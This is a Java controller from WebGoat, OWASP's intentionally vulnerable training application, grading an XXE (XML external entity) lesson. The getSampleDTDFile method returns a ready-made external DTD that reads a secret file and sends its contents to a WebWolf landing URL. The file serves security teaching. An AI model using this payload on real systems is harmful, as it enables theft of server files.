package org.owasp.webgoat.lessons.xmlread;

import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;

import jakarta.servlet.http.HttpServletRequest;
import org.apache.commons.exec.OS;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
import org.owasp.webgoat.container.assignments.AssignmentHints;
import org.owasp.webgoat.container.assignments.AttackResult;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;


@RestController
public class SimpleXML extends AssignmentEndpoint {

  private static final String[] DEFAULT_LINUX_DIRECTORIES = {"usr", "etc", "var"};
  private static final String[] DEFAULT_WINDOWS_DIRECTORIES = {
    "Windows", "Program Files (x86)", "Program Files", "pagefile.sys"
  };

  @Value("${webgoat.server.directory}")
  private String webGoatHomeDirectory;

  @Value("${webwolf.landingpage.url}")
  private String webWolfURL;

  @Autowired private CommentsCache comments;

  @PostMapping(path = "/notes/simple", consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)
  @ResponseBody
  public AttackResult createNewComment(HttpServletRequest request, @RequestBody String commentStr) {
    String error = "";
    try {
      var comment = comments.parseXml(commentStr);
      comments.addComment(comment, false);
      if (checkSolution(comment)) {
        return success(this).build();
      }
    } catch (Exception e) {
      error = ExceptionUtils.getStackTrace(e);
    }
    return failed(this).output(error).build();
  }

  private boolean checkSolution(Comment comment) {
    String[] directoriesToCheck =
        OS.isFamilyMac() || OS.isFamilyUnix()
            ? DEFAULT_LINUX_DIRECTORIES
            : DEFAULT_WINDOWS_DIRECTORIES;
    boolean success = false;
    for (String directory : directoriesToCheck) {
      success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(), directory);
    }
    return success;
  }

  @RequestMapping(
      path = "/xmlread/sampledtd",
      consumes = ALL_VALUE,
      produces = MediaType.TEXT_PLAIN_VALUE)
  @ResponseBody
  public String getSampleDTDFile() {
    return """
                <?xml version="1.0" encoding="UTF-8"?>
                <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/xmlread/secret.txt">
                <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
                %all;
                """;
  }
}
